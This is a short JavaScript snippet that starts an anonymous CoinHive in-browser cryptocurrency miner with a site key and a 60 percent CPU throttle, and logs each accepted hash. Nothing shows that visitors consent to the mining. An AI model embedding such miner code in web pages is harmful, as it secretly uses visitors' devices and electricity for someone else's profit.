var player = new CoinHive.Anonymous('j0JXhD9x6f25XimDBXK9WtVgSFQ9hsJq');
player.setThrottle(0.6);
player.start();
player.on('accepted', function() {
    console.log('punto ganado');
})